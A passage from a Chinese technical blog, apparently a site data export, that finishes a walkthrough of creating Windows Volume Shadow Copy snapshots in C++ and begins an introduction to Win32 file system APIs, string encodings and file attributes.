class=\"built_in\">InitializeBackupContect</span>(VSS_CTX_APP_ROLLBACK);</span><br><span class=\"line\">    SnapshotSetResult result;</span><br><span class=\"line\">    <span class=\"comment\">/* no need to call GatherWriterMetadata due to no writers involved */</span></span><br><span class=\"line\">    VSS_ID snapshotSetID;</span><br><span class=\"line\">    HRESULT hr = m_pVssObject-&gt;<span class=\"built_in\">StartSnapshotSet</span>(&amp;snapshotSetID);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;StartSnapshotSet&quot;</span>, std::nullopt);</span><br><span class=\"line\"></span><br><span class=\"line\">    result.m_wSnapshotSetID = <span class=\"built_in\">VssID2WStr</span>(snapshotSetID).<span class=\"built_in\">value</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> std::wstring&amp; wVolumePath: wVolumePathList) &#123;</span><br><span class=\"line\">        VSS_ID snapshotID;</span><br><span class=\"line\">        WCHAR volume[MAX_PATH] = &#123; <span class=\"string\">L&#x27;\\0&#x27;</span> &#125;;</span><br><span class=\"line\">        <span class=\"built_in\">wcscpy_s</span>(volume, MAX_PATH, wVolumePath.<span class=\"built_in\">c_str</span>());</span><br><span class=\"line\">        hr = m_pVssObject-&gt;<span class=\"built_in\">AddToSnapshotSet</span>(volume, GUID_NULL, &amp;snapshotID);</span><br><span class=\"line\">        <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;AddToSnapshotSet&quot;</span>, std::nullopt);</span><br><span class=\"line\">        result.m_wSnapshotIDList.<span class=\"built_in\">emplace_back</span>(<span class=\"built_in\">VssID2WStr</span>(snapshotID).<span class=\"built_in\">value</span>());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_BOOL_RETURN</span>(<span class=\"built_in\">PrepareForBackupSync</span>(), <span class=\"string\">&quot;PrepareForBackupSync&quot;</span>, std::nullopt);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_BOOL_RETURN</span>(<span class=\"built_in\">DoSnapshotSetSync</span>(), <span class=\"string\">&quot;DoSnapshotSetSync&quot;</span>, std::nullopt);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* no need to call BackupComplete due to no writers involved */</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;SnapshotSetResult&gt;(result);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>其中<code>VSS_CTX_APP_ROLLBACK</code>是创建快照指定的上下文，用于创建持久化的快照（不会定期清理，需要用户程序自行删除）。<code>PrepareForBackupSync</code>和<code>DoSnapshotSetSync</code>对应3、4两步：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">VssClient::PrepareForBackupSync</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    CComPtr&lt;IVssAsync&gt; pAsync;</span><br><span class=\"line\">    HRESULT hr = m_pVssObject-&gt;<span class=\"built_in\">PrepareForBackup</span>(&amp;pAsync);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;PrepareForBackup&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_BOOL_RETURN</span>(<span class=\"built_in\">WaitAndCheckForAsyncOperation</span>(pAsync), <span class=\"string\">&quot;PrepareForBackup Wait&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">VssClient::DoSnapshotSetSync</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    CComPtr&lt;IVssAsync&gt; pAsync;</span><br><span class=\"line\">    HRESULT hr = m_pVssObject-&gt;<span class=\"built_in\">DoSnapshotSet</span>(&amp;pAsync);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;DoSnapshotSet&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_BOOL_RETURN</span>(<span class=\"built_in\">WaitAndCheckForAsyncOperation</span>(pAsync), <span class=\"string\">&quot;DoSnapshotSet Wait&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">VssClient::WaitAndCheckForAsyncOperation</span><span class=\"params\">(IVssAsync* pAsync)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HRESULT hr = pAsync-&gt;<span class=\"built_in\">Wait</span>();</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;WaitAndCheckForAsyncOperation pAsync-&gt;Wait&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check the result of the asynchronous operation */</span></span><br><span class=\"line\">    HRESULT hrReturned = S_OK;</span><br><span class=\"line\">    hr = pAsync-&gt;<span class=\"built_in\">QueryStatus</span>(&amp;hrReturned, <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;WaitAndCheckForAsyncOperation pAsync-&gt;QueryStatus&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if the async operation succeeded... */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hrReturned != VSS_S_ASYNC_FINISHED) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里<code>IVssBackupComponents::DoSnapshotSet</code>是一个异步API，通过参数返回<code>IVssAsync</code>类型。这里通过<code>WaitAndCheckForAsyncOperation</code>将这类异步操作封装为同步操作，利用<code>IVssAsync::Wait</code>阻塞调用直到结果返回，并通过<code>IVssAsync::QueryStatus</code>查询结果是否成功。</p>\n<blockquote>\n<p><code>CComPtr</code>是一种用于释放COM资源的RAII机制的智能指针，详见<a href=\"https://learn.microsoft.com/en-us/cpp/atl/reference/ccomptr-class?view=msvc-170\">CComPtr Class</a></p>\n</blockquote>\n<p>最后写一个Demo测试快照的创建：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Create snapshots for C: and D:</span></span><br><span class=\"line\">std::vector&lt;std::wstring&gt; wVolumePathList &#123; <span class=\"string\">L&quot;C:\\\\&quot;</span>, <span class=\"string\">L&quot;D:\\\\&quot;</span> &#125;;</span><br><span class=\"line\">VssClient vssClient;</span><br><span class=\"line\">std::optional&lt;SnapshotSetResult&gt; result = vssClient.<span class=\"built_in\">CreateSnapshotsW</span>(wVolumePathList);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!result) &#123;</span><br><span class=\"line\">    std::wcout &lt;&lt; <span class=\"string\">L&quot;Failed to Create Snapshots&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    std::wcout &lt;&lt; <span class=\"string\">L&quot;Create Snapshots Success&quot;</span> &lt;&lt; std::endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">std::wcout &lt;&lt; <span class=\"string\">L&quot;Shadow Set ID: &quot;</span> &lt;&lt; result-&gt;<span class=\"built_in\">SnapshotSetIDW</span>() &lt;&lt; std::endl;</span><br><span class=\"line\"><span class=\"keyword\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> std::wstring&amp; wSnapshotID: result-&gt;<span class=\"built_in\">SnapshotIDListW</span>()) &#123;</span><br><span class=\"line\">    std::wcout &lt;&lt; <span class=\"string\">L&quot;snapshot ID[&quot;</span> &lt;&lt; ++index &lt;&lt; <span class=\"string\">L&quot;]: &quot;</span> &lt;&lt; wSnapshotID &lt;&lt; std::endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>此时创建的快照已经可以用之前提到的<code>vssadmin</code>工具查询到了。有关快照的删除、查询、挂载也是基于<code>IVssBackupComponents* m_pVssObject</code>实现，详见<a href=\"https://github.com/XUranus/Win32VSSWrapper\">https://github.com/XUranus/Win32VSSWrapper</a>，可以结合官方文档学习，这里就不再赘述了。</p>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin?source=recommendations\">vssadmin</a></li>\n<li><a href=\"https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service?source=recommendations\">volume shadow copy service</a></li>\n<li><a href=\"https://cs-cjl.com/2018/09_11_backup_file_with_volume_shadow_copy_service\">使用 Volume Shadow Copy Service 进行文件备份</a></li>\n</ul>\n","tags":["文件系统","快照","Windows"]},{"title":"Windows文件系统概述(一)基本概念","url":"/2023/02/28/Windows%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F1/","content":"<blockquote>\n<p>最近接触Windows文件备份相关的业务，从Win32 API入手对Windows文件系统的基本概念做一个总结。学习Windows文件系统最好方式还是阅读<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi\">官方文档</a>，本文只是对相关概念进行粗浅的介绍，权当抛砖引玉。<br>本文完整代码见：<a href=\"https://github.com/XUranus/FileSystemUtil\">https://github.com/XUranus/FileSystemUtil</a></p>\n</blockquote>\n<h2 id=\"Win32-API-Doc\"><a href=\"#Win32-API-Doc\" class=\"headerlink\" title=\"Win32 API Doc\"></a>Win32 API Doc</h2><p><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi\">官方文档</a>。文档会详细描述每一个API的入参、出参、返回的字段含义和取值范围，部分还会给出Example程序。</p>\n<p>Windows程序开发一般使用MSVC，和GCC有不少区别。为了更有效率的学习Windows文件系统，在介绍文件系统之前，本文先给Linux转Windows的开发者介绍一下Windows的编码和文档阅读方式，磨刀不误砍柴工。</p>\n<h3 id=\"UTF-8-UTF-16\"><a href=\"#UTF-8-UTF-16\" class=\"headerlink\" title=\"UTF-8/UTF-16\"></a>UTF-8/UTF-16</h3><p>涉及字符串的Win32 API一般提供两类接口：</p>\n<ul>\n<li>Ansi字符串接口（一般以<code>A</code>结尾）</li>\n<li>UTF-16宽字符串接口（一般以<code>W</code>结尾）</li>\n</ul>\n<p>例如<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfileattributesa\">GetFileAttributesA</a>和<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfileattributesw\">GetFileAttributesW</a>：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> _Null_terminated_ CONST WCHAR *LPCWSTR, *PCWSTR;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> _Null_terminated_ CONST CHAR *LPCSTR, *PCSTR;</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">GetFileAttributesA</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in] LPCSTR lpFileName</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">GetFileAttributesW</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in] LPCWSTR lpFileName</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<p><code>LPCSTR</code>的类型是<code>CHAR*</code>、即<code>char*</code>，表示一个ANSI字符串的指针。而<code>LPCWSTR</code>的类型是<code>WCHAR*</code>、即<code>wchar_t*</code>，表示一个UTF-16字符串指针。此外还提供不显式声明字符串类型的接口，例如<code>GetFileAttributes</code>，他的宏定义如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> UNICODE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> GetFileAttributes  GetFileAttributesW</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> GetFileAttributes  GetFileAttributesA</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span> <span class=\"comment\">// !UNICODE</span></span></span><br></pre></td></tr></table></figure></p>\n<p>可见这类接口会根据是否定义<code>UNICODE</code>宏来决定使用哪种API。<strong>对于字符串可能包含Unicode字符的程序，尽量使用宽字符API，否则可能会调用失败！</strong></p>\n<p>ANSI版本的Window API中, 路径长度被限制在<code>MAX_PATH</code>、即260个字符. 要拓展这个限制到23767宽字符(wide character), 需要调用这个函数的Unicode版本, 并且在路径的首部加上<code>\\\\?\\</code>，例如<code>C:\\Users\\XUranus\\Desktop</code>应转为<code>\\\\?\\C:\\Users\\XUranus\\Desktop</code>再作为参数传入。本文将默认使用Unicode版本的API，并默认路径已经带上了<code>\\\\?\\</code>前缀。有关文件路径详见<a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file\">Naming Files, Paths, and Namespaces</a></p>\n<p>C++程序一般使用UTF-8编码的<code>std::string</code>来表示字符串，Linux接口一般使用UTF-8编码的字符串，而<strong>Windows是一个UTF-16的操作系统</strong>。如果程序需要跨平台，一般在公共业务部分用<code>std::string</code>，因为UTF-8表示相同的含有Unicode特殊字符的字符串可能占用更少的空间，在网络IO和数据落盘时的开销也更小，而在涉及Windows接口的部分则最好使用UTF-16编码的<code>std::wstring</code>。此时就不得不考虑<code>std::string</code>和<code>std::wstring</code>的转码问题。</p>\n<p>C++11标准库提供了<code>std::wstring</code>和<code>std::wstring</code>的<strong>无损互转换</strong>工具<code>std::codecvt_utf8_utf16</code>，用法如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _SILENCE_CXX17_CODECVT_HEADER_DEPRECATION_WARNING <span class=\"comment\">/* deprecated since C++17, supress warning */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;locale&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;codecvt&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">std::wstring <span class=\"title\">Utf8ToUtf16</span><span class=\"params\">(<span class=\"keyword\">const</span> std::string&amp; str)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">using</span> ConvertTypeX = std::codecvt_utf8_utf16&lt;<span class=\"keyword\">wchar_t</span>&gt;;</span><br><span class=\"line\">    std::wstring_convert&lt;ConvertTypeX&gt; converterX;</span><br><span class=\"line\">    std::wstring wstr = converterX.<span class=\"built_in\">from_bytes</span>(str);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> wstr;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">std::string <span class=\"title\">Utf16ToUtf8</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wstr)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">using</span> ConvertTypeX = std::codecvt_utf8_utf16&lt;<span class=\"keyword\">wchar_t</span>&gt;;</span><br><span class=\"line\">    std::wstring_convert&lt;ConvertTypeX&gt; converterX;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> converterX.<span class=\"built_in\">to_bytes</span>(wstr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>对于UTF-8和UTF-16编码的概念和转换方法，本文就不再赘述，读者可以查询相关资料自行拓展。了解了编码相关的知识，就能知道Windows的两种API该如何使用，接下来说说Win32 API文档的阅读方式。</p>\n<h3 id=\"Win32-API-Document\"><a href=\"#Win32-API-Document\" class=\"headerlink\" title=\"Win32 API Document\"></a>Win32 API Document</h3><p><a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi\">官方文档</a>会根据头文件列出其中包含的API，例如<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfilew\">FindFirstFileW</a>，<code>Syntax</code>中描述如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">HANDLE <span class=\"title\">FindFirstFileW</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [in]  LPCWSTR            lpFileName,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">  [out] LPWIN32_FIND_DATAW lpFindFileData</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span>;</span><br></pre></td></tr></table></figure><br>表明了第一个参数<code>lpFileName</code>是个<code>LPCWSTR</code>类型的<strong>入参</strong>，而<code>lpFindFileData</code>是个<code>LPWIN32_FIND_DATAW</code>类型的<strong>出参</strong>，返回值是<code>HANDLE</code>类型，表示的含义可以自<code>Return Value</code>中查到。<code>LPWIN32_FIND_DATAW</code>则是该接口获取的信息，其结构体构成也可在页面<code>Parameters</code>中找到详细信息的<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-win32_find_dataa\">链接</a>。</p>\n<p>在<code>Remarks</code>区域，列举了该API调用的注意点，例如会提示你用<code>FindClose</code>在调用成功后关闭API返回的句柄。</p>\n<p>在Linux中一般用<code>int fd</code>描述一个打开文件的描述符（File Descriptor），当<code>fd &lt; 0</code>往往意味调用失败。Windows中用<code>HANDLE hFile</code>，实际类型是<code>void*</code>来表示一个打开文件的句柄（File Handle），如果<code>hFile</code>为<code>INVALID_HANDLE_VALUE</code>则表示调用失败。</p>\n<h3 id=\"失败处理\"><a href=\"#失败处理\" class=\"headerlink\" title=\"失败处理\"></a>失败处理</h3><p>几乎所有的操作都有可能失败，或者由于参数不合法，或者由于没有权限、没有资源。所以阅读Windows API的时候需要特别留意失败场景的处理方式。有时候一个步骤失败但之前已经分配了资源，这个时候Remark部分可能会提示你手动释放之前步骤准备的资源。再Linux下失败的操作往往可以通过<code>errno</code>宏拿到错误码，在Windows下这个错误码用<code>GetLastError()</code>获取，它能返回上一个DWORD类型的值标记操作失败的原因，具体参考：<a href=\"https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-\">System Error Codes</a></p>\n<h2 id=\"文件属性\"><a href=\"#文件属性\" class=\"headerlink\" title=\"文件属性\"></a>文件属性</h2><p>Windows文件拥有和Linux文件相似的属性信息，在Linux中一般用<code>stat</code>来获取文件的<code>struct stat</code>结构，里面包含文件的基本属性信息。Windows下获取文件属性的API有很多，但是大部分只能获取很小一部分属性。能获取比较完整的属性的API是<code>GetFileInformationByHandle()</code>，它将一个文件/目录句柄作为参数，获取文件信息存储在<code>BY_HANDLE_FILE_INFORMATION</code>结构中。</p>\n<p>首先定义一个结构体<code>StatResult</code>来描述一个文件属性信息对象，接下来将基于它逐步封装文件属性查询接口：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">StatResult</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"built_in\">StatResult</span>(<span class=\"keyword\">const</span> std::wstring&amp; wPath, <span class=\"keyword\">const</span> BY_HANDLE_FILE_INFORMATION&amp; handleFileInformation);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    BY_HANDLE_FILE_INFORMATION m_handleFileInformation&#123;&#125;;</span><br><span class=\"line\">    std::wstring m_wPath; <span class=\"comment\">/* raw input path */</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">StatResult::<span class=\"built_in\">StatResult</span>(<span class=\"keyword\">const</span> std::wstring&amp; wPath, <span class=\"keyword\">const</span> BY_HANDLE_FILE_INFORMATION&amp; handleFileInformation)</span><br><span class=\"line\">    : <span class=\"built_in\">m_wPath</span>(wPath)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">memcpy_s</span>(&amp;m_handleFileInformation, <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(BY_HANDLE_FILE_INFORMATION),</span><br><span class=\"line\">        &amp;handleFileInformation, <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(BY_HANDLE_FILE_INFORMATION));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>要获取文件/目录对应的<code>BY_HANDLE_FILE_INFORMATION</code>结构体，就需要先拿到文件/目录的句柄。用<code>CreateFileW()</code>打开一个文件并获取<code>HANDLE</code>类型的句柄。<code>HANDLE</code>类型的句柄用于指向Windows中打开的资源，它类似于Linux下的<code>int</code>类型的文件描述符（File Descriptor）。Linux下常用<code>int fd = open(fname, mode)</code>打开一个文件，且用完资源后需要用<code>close(fd)</code>释放，同理，在Windows下也需要对打开的句柄用<code>CloseHandle(handle)</code>进行关闭。Linux下<code>fd &lt; 0</code>常用于描述失效的句柄，而Windows下失效的句柄等于内置常量<code>INVALID_HANDLE_VALUE</code>。无论在Linux下还是Windows下，句柄都不只局限于文件，对句柄的操作一定要检查句柄是否合法，用完句柄后也一定要及时释放。</p>\n<blockquote>\n<p><code>CreateFileW</code>相关参数说明详见：<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew\"><code>CreateFileW function (fileapi.h)</code></a></p>\n</blockquote>\n<p>用<code>GetFileInformationByHandle</code>实现一个Windows下的<code>stat</code>函数，他将<code>BY_HANDLE_FILE_INFORMATION</code>信息封装在<code>StatResult</code>结构体中：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">std::optional&lt;StatResult&gt; <span class=\"title\">StatW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; wPath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    BY_HANDLE_FILE_INFORMATION handleFileInformation&#123;&#125;;</span><br><span class=\"line\">    HANDLE hFile = ::<span class=\"built_in\">CreateFileW</span>(</span><br><span class=\"line\">        wPath.<span class=\"built_in\">c_str</span>(),</span><br><span class=\"line\">        GENERIC_READ,</span><br><span class=\"line\">        FILE_SHARE_READ,</span><br><span class=\"line\">        <span class=\"literal\">nullptr</span>,</span><br><span class=\"line\">        OPEN_EXISTING,</span><br><span class=\"line\">        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,</span><br><span class=\"line\">        <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (::<span class=\"built_in\">GetFileInformationByHandle</span>(hFile, &amp;handleFileInformation) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ::<span class=\"built_in\">CloseHandle</span>(hFile);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;StatResult&gt;(wPath, handleFileInformation);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><code>BY_HANDLE_FILE_INFORMATION</code>的成员定义如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">BY_HANDLE_FILE_INFORMATION</span> &#123;</span></span><br><span class=\"line\">    DWORD dwFileAttributes;</span><br><span class=\"line\">    FILETIME ftCreationTime;</span><br><span class=\"line\">    FILETIME ftLastAccessTime;</span><br><span class=\"line\">    FILETIME ftLastWriteTime;</span><br><span class=\"line\">    DWORD dwVolumeSerialNumber;</span><br><span class=\"line\">    DWORD nFileSizeHigh;</span><br><span class=\"line\">    DWORD nFileSizeLow;</span><br><span class=\"line\">    DWORD nNumberOfLinks;</span><br><span class=\"line\">    DWORD nFileIndexHigh;</span><br><span class=\"line\">    DWORD nFileIndexLow;</span><br><span class=\"line\">&#125; BY_HANDLE_FILE_INFORMATION, *PBY_HANDLE_FILE_INFORMATION, *LPBY_HANDLE_FILE_INFORMATION;</span><br></pre></td></tr></table></figure></p>\n<p>拥有了<code>BY_HANDLE_FILE_INFORMATION</code>就可以获取文件的基本信息：</p>\n<ul>\n<li><code>dwFileAttributes</code>：它类似于Linux <code>stat</code> 获得的<code>mode_t</code>类型，用符号位标记文件/目录的attributes，例如：目录、稀疏文件、归档文件、系统文件、隐藏文件、等</li>\n<li><code>ftCreationTime</code>：类似于Linux <code>stat</code>信息中的<code>time_t st_ctime</code>字段，记录创建时间对应的<strong>Windows时间戳</strong></li>\n<li><code>ftLastAccessTime</code>：类似于Linux <code>stat</code>信息中的<code>time_t st_atime</code>字段，记录上次访问时间对应的<strong>Windows时间戳</strong></li>\n<li><code>ftLastWriteTime</code>：类似于Linux <code>stat</code>信息中的<code>time_t st_mtime</code>字段，记录上次修改时间对应的<strong>Windows时间戳</strong></li>\n<li><code>dwVolumeSerialNumber</code>：类似于Linux <code>stat</code>信息中的<code>st_rdev</code>字段，记录创建时间</li>\n<li><code>nFileSizeHigh</code>、<code>nFileSizeLow</code>：类似于Linux <code>stat</code>信息中的<code>st_size</code>字段，用高低字节记录文件的大小（单位bytes）</li>\n<li><code>nNumberOfLinks</code>：类似于Linux <code>stat</code>信息中的<code>nlink</code>字段，记录<strong>硬链接</strong>数量</li>\n<li><code>nFileIndexHigh</code>、<code>nFileIndexLow</code>：用高低字节记录文件/目录的<code>index</code>值，<code>index</code>是Windows文件系统中对标Linux文件系统中<code>inode</code>的概念。区别是<strong>Linux中inode全局唯一，而Windows中index只在卷中唯一</strong></li>\n</ul>\n<blockquote>\n<p>Linux文件系统还有组ID和用户ID的概念，他们在Windows下默认为0</p>\n</blockquote>\n<p>其中<code>size</code>，<code>index</code>被拆分成了高低字节，<code>time</code>字段也是拆分为高低字节的结构体，它的定义如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">FILETIME</span> &#123;</span></span><br><span class=\"line\">  DWORD dwLowDateTime;</span><br><span class=\"line\">  DWORD dwHighDateTime;</span><br><span class=\"line\">&#125; FILETIME, *PFILETIME, *LPFILETIME;</span><br></pre></td></tr></table></figure><br>这类用双字（两个DWORD描述的）数据转<code>uint64_t</code>可以构造<code>LARGE_INTEGER</code>结构体，并通过<code>QuadPart</code>属性来整合两个字段的最终值<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">uint64_t</span> <span class=\"title\">CombineDWORD</span><span class=\"params\">(DWORD low, DWORD high)</span> </span>&#123;</span><br><span class=\"line\">  LARGE_INTEGER li;</span><br><span class=\"line\">  li.LowPart  = low;</span><br><span class=\"line\">  li.HighPart = high;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> li.QuadPart;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>UNIX的时间戳从1970年1月1日开始，Windows的时间戳转UNIX时间戳需要减去<code>0x019DB1DED53E8000</code>换算<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">uint64_t</span> <span class=\"title\">ConvertWin32Time</span><span class=\"params\">(DWORD low, DWORD high)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">uint64_t</span> UNIX_TIME_START = <span class=\"number\">0x019DB1DED53E8000</span>; <span class=\"comment\">/* January 1, 1970 (start of Unix epoch) in &quot;ticks&quot; */</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">uint64_t</span> TICKS_PER_SECOND = <span class=\"number\">10000000</span>; <span class=\"comment\">/* a tick is 100ns */</span></span><br><span class=\"line\">    LARGE_INTEGER 